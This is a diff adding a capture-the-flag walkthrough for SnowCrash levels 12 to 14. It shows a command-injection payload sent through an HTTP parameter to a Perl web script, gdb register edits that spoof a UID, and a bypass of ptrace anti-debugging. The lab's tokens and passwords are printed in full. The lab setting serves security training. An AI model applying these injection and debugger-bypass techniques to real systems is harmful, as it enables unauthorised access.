@@ -1377,4 +1377,391 @@ level12@SnowCrash:~$ curl '127.0.0.1:4646?x=test&y=test2'
 .
 ```
 
+Once logged in with the level12 user, we are greeted by a basic perl script, all it did was:
 
+- take 2 arguments in the http request: `x` & `y`
+- execute some regex replacement to the parameters sent (replace lowercase by caps, and remove all but the first 'word')
+- execute an `egrep` command on `/tmp/xd` to search for lines containing the content of `$xx`
+- And we don't care of the rest because it wouldn't print the token in any way
+
+### Exploit
+
+The goal was to make the server run the getflag command without just sending it `getflag` in the `x` parameter as it would be replaced by `GETFLAG`, which does not exists.
+
+Running the following command made the vm crash so I thought what I sent to the server was executed
+
+```bash
+level12@SnowCrash:~$ curl '127.0.0.1:4646?x=$(./*)&y=test2'
+.
+```
+
+After rebooting the vm i tried with a script with a filename in caps that would execute `getflag` (in lowercase):
+```bash
+level12@SnowCrash:~$ nano /tmp/GETFLAG
+#!/bin/bash
+getflag >> /tmp/GETFLAG
+exit 0
+```
+
+Gave permissions for the server to execute it:
+
+```bash
+level12@SnowCrash:~$ chmod 777 /tmp/GETFLAG
+```
+
+Then executed it with the following arguments:
+
+```bash
+level12@SnowCrash:/tmp$ curl '127.0.0.1:4646?x=$(/*/GETFLAG)&y=test2'
+.
+```
+
+As the script name is already in caps, and we don't have any other word than the first one, the command is not modified by the regex expressions.
+
+```bash
+.level12@SnowCrash:~$ cat /tmp/GETFLAG
+#!/bin/bash
+getflag >> /tmp/GETFLAG
+exit 0
+Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
+```
+
+Note: the `*` here is important as passing `/tmp/GETFLAG` would result of the script executing `/TMP/GETFLAG`, but `/TMP` does not exists.
+
+### Goto level13
+
+```bash
+level12@SnowCrash:/tmp$ su level13
+Password: <<< 'g1qKMiRpXf53AWhDaU7FEkczr'
+```
+
+## Level13
+
+```bash
+level13@SnowCrash:~$ ./level13
+UID 2013 started us but we we expect 4242
+```
+
+The goal will be to fake the user id of the program
+
+After looking for how to do this with cgroups, by using something like [nsjail](https://github.com/google/nsjail), or even container mappings and seeing that `lxc` & `docker` were not installed, I tried to use gdb
+
+### Exploit
+
+- Start the program with `gdb`
+
+```bash
+level13@SnowCrash:~$ gdb ./level13
+GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
+Copyright (C) 2012 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "i686-linux-gnu".
+For bug reporting instructions, please see:
+<http://bugs.launchpad.net/gdb-linaro/>...
+Reading symbols from /home/user/level13/level13...(no debugging symbols found)...done.
+```
+
+- Look for getuid() calls
+
+```gdb
+(gdb) disas /m main
+Dump of assembler code for function main:
+   0x0804858c <+0>:     push   %ebp
+   0x0804858d <+1>:     mov    %esp,%ebp
+   0x0804858f <+3>:     and    $0xfffffff0,%esp
+   0x08048592 <+6>:     sub    $0x10,%esp
+   0x08048595 <+9>:     call   0x8048380 <getuid@plt>
+   0x0804859a <+14>:    cmp    $0x1092,%eax
+   0x0804859f <+19>:    je     0x80485cb <main+63>
+   0x080485a1 <+21>:    call   0x8048380 <getuid@plt>
+   0x080485a6 <+26>:    mov    $0x80486c8,%edx
+   0x080485ab <+31>:    movl   $0x1092,0x8(%esp)
+   0x080485b3 <+39>:    mov    %eax,0x4(%esp)
+   0x080485b7 <+43>:    mov    %edx,(%esp)
+   0x080485ba <+46>:    call   0x8048360 <printf@plt>
+   0x080485bf <+51>:    movl   $0x1,(%esp)
+   0x080485c6 <+58>:    call   0x80483a0 <exit@plt>
+   0x080485cb <+63>:    movl   $0x80486ef,(%esp)
+   0x080485d2 <+70>:    call   0x8048474 <ft_des>
+   0x080485d7 <+75>:    mov    $0x8048709,%edx
+   0x080485dc <+80>:    mov    %eax,0x4(%esp)
+   0x080485e0 <+84>:    mov    %edx,(%esp)
+   0x080485e3 <+87>:    call   0x8048360 <printf@plt>
+   0x080485e8 <+92>:    leave
+   0x080485e9 <+93>:    ret
+End of assembler dump.
+```
+
+- Place a breakpoint after the getuid() call to replace the return value stored in the register
+
+```bash
+(gdb) break *0x0804859a
+Breakpoint 1 at 0x804859a
+```
+
+- Start the program
+
+```bash
+(gdb) run
+Starting program: /home/user/level13/level13
+
+Breakpoint 1, 0x0804859a in main ()
+```
+
+- Look for register values, our user id is here!
+
+```bash
+(gdb) info registers
+eax            0x7dd    2013
+ecx            0xbffff734       -1073744076
+edx            0xbffff6c4       -1073744188
+ebx            0xb7fd0ff4       -1208152076
+esp            0xbffff680       0xbffff680
+ebp            0xbffff698       0xbffff698
+esi            0x0      0
+edi            0x0      0
+eip            0x804859a        0x804859a <main+14>
+eflags         0x200246 [ PF ZF IF ID ]
+cs             0x73     115
+ss             0x7b     123
+ds             0x7b     123
+es             0x7b     123
+fs             0x0      0
+gs             0x33     51
+```
+
+- Replace the userid value stored in the register
+
+```bash
+(gdb) set $eax = 4242
+```
+
+```bash
+(gdb) continue
+Continuing.
+your token is 2A31L79asukciNyi8uppkEuSx
+[Inferior 1 (process 3117) exited with code 050]
+(gdb) quit
+```
+
+### Goto level14
+
+```bash
+level13@SnowCrash:~$ su level14
+Password: <<< '2A31L79asukciNyi8uppkEuSx'
+```
+
+## Level14
+
+```bash
+level14@SnowCrash:~$ ls -lA
+total 12
+-r-x------ 1 level14 level14  220 Apr  3  2012 .bash_logout
+-r-x------ 1 level14 level14 3518 Aug 30  2015 .bashrc
+-r-x------ 1 level14 level14  675 Apr  3  2012 .profile
+```
+
+```bash
+level14@SnowCrash:~$ which getflag
+/bin/getflag
+```
+
+```bash
+level14@SnowCrash:~$ objdump -d /bin/getflag |  curl -F 'f:1=<-' ix.io
+http://ix.io/2aQN
+level14@SnowCrash:~$ gdb /bin/getflag
+GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
+Copyright (C) 2012 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "i686-linux-gnu".
+For bug reporting instructions, please see:
+<http://bugs.launchpad.net/gdb-linaro/>...
+Reading symbols from /bin/getflag...(no debugging symbols found)...done.
+(gdb) run
+Starting program: /bin/getflag
+You should not reverse this
+[Inferior 1 (process 2266) exited with code 01]
+(gdb)
+```
+
+Running `strings` on the program tells us the password are stored in encrypted strings, we can think the program calls getuid() to know which user is running the program and decodes the password of the associated uid.
+
+```bash
+level14@SnowCrash:~$ strings /bin/getflag
+...
+/proc/self/maps
+/proc/self/maps is unaccessible, probably a LD_PRELOAD attempt exit..
+libc
+Check flag.Here is your token :
+You are root are you that dumb ?
+I`fA>_88eEd:=`85h0D8HE>,D
+7`4Ci4=^d=J,?>i;6,7d416,7
+<>B16\AD<C6,G_<1>^7ci>l4B
+B8b:6,3fj7:,;bh>D@>8i:6@D
+?4d@:,C>8C60G>8:h:Gb4?l,A
+G8H.6,=4k5J0<cd/D@>>B:>:4
+H8B8h_20B4J43><8>\ED<;j@3
+78H:J4<4<9i_I4k0J^5>B1j`9
+bci`mC{)jxkn<"uD~6%g7FK`7
+Dc6m~;}f8Cj#xFkel;#&ycfbK
+74H9D^3ed7k05445J0E4e;Da4
+70hCi,E44Df[A4B/J@3f<=:`D
+8_Dw"4#?+3i]q&;p6 gtw88EC
+boe]!ai0FB@.:|L6l@A?>qJ}I
+g <t61:|4_|!@IF.-62FH&G~DCK/Ekrvvdwz?v|
+Nope there is no token here for you sorry. Try again :)
+00000000 00:00 0
+LD_PRELOAD detected through memory maps exit ..
+;*2$"$
+...
+```
+
+### Exploit
+
+- [Full disassembly](http://ix.io/2aQN)
+
+- Start gdb with getflag
+
+```bash
+level14@SnowCrash:~$ gdb /bin/getflag
+GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
+Copyright (C) 2012 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "i686-linux-gnu".
+For bug reporting instructions, please see:
+<http://bugs.launchpad.net/gdb-linaro/>...
+Reading symbols from /bin/getflag...(no debugging symbols found)...done.
+```
+
+- Place a breakpoint for the next ptrace call, checking if the program is running in a debugger
+
+```bash
+(gdb) break ptrace
+Breakpoint 1 at 0x8048540
+```
+
+- Start the program until the breakpoint is reached
+
+```bash
+(gdb) run
+Starting program: /bin/getflag
+
+Breakpoint 1, 0xb7f146d0 in ptrace () from /lib/i386-linux-gnu/libc.so.6
+```
+
+- Step in the ptrace function and step until the end of it
+
+```bash
+(gdb) si
+0xb7f146d3 in ptrace () from /lib/i386-linux-gnu/libc.so.6
+
+(gdb) s
+Single stepping until exit from function ptrace,
+which has no line number information.
+0x0804898e in main ()
+```
+
+- Replace the return of the ptrace function to simulate we're not running this in a debugger
+
+```bash
+(gdb) info registers
+eax            0xffffffff	-1
+ecx            0xb7e2b900	-1209878272
+edx            0xffffffc8	-56
+ebx            0xb7fd0ff4	-1208152076
+esp            0xbffff5f0	0xbffff5f0
+ebp            0xbffff718	0xbffff718
+esi            0x0	0
+edi            0x0	0
+eip            0x804898e	0x804898e <main+72>
+eflags         0x200282	[ SF IF ID ]
+cs             0x73	115
+ss             0x7b	123
+ds             0x7b	123
+es             0x7b	123
+fs             0x0	0
+gs             0x33	51
+(gdb) set $eax = 0
+```
+
+- Place the next breakpoint until the getuid() call, which will verify we're running the program with the `flagXX` user
+
+```bash
+(gdb) break getuid
+Breakpoint 2 at 0xb7ee4cc0
+```
+
+- Continue the execution until the next breakpoint
+
+```bash
+(gdb) continue
+Continuing.
+
+Breakpoint 2, 0xb7ee4cc0 in getuid () from /lib/i386-linux-gnu/libc.so.6
+```
+
+- Step in the getuid() function and step until the end of it
+
+```bash
+(gdb) si
+0xb7ee4cc5 in getuid () from /lib/i386-linux-gnu/libc.so.6
+(gdb) s
+Single stepping until exit from function getuid,
+which has no line number information.
+0x08048b02 in main ()
+```
+
+- Replace the return of the getuid() function with the uid of the `flag14` user
+
+```bash
+(gdb) info registers
+eax            0x7de	2014
+ecx            0xb7fda000	-1208115200
+edx            0x20	32
+ebx            0xb7fd0ff4	-1208152076
+esp            0xbffff5f0	0xbffff5f0
+ebp            0xbffff718	0xbffff718
+esi            0x0	0
+edi            0x0	0
+eip            0x8048b02	0x8048b02 <main+444>
+eflags         0x200246	[ PF ZF IF ID ]
+cs             0x73	115
+ss             0x7b	123
+ds             0x7b	123
+es             0x7b	123
+fs             0x0	0
+gs             0x33	51
+(gdb) set $eax = 3014
+```
+
+- Continue the execution of the program
+
+```bash
+(gdb) continue
+Continuing.
+Check flag.Here is your token : 7QiHafiNa3HVozsaXkawuYrTstxbpABHD8CPnHJ
+[Inferior 1 (process 2168) exited normally]
+(gdb)
+The program is not being run.
+```
+
+
+### Finish the project !
+
+```bash
+level14@SnowCrash:~$ su flag14
+Password: <<< '7QiHafiNa3HVozsaXkawuYrTstxbpABHD8CPnHJ'
+Congratulation. Type getflag to get the key and send it to me the owner of this livecd :)
+
+flag14@SnowCrash:~$ getflag
+Check flag.Here is your token : 7QiHafiNa3HVozsaXkawuYrTstxbpABHD8CPnHJ
+```
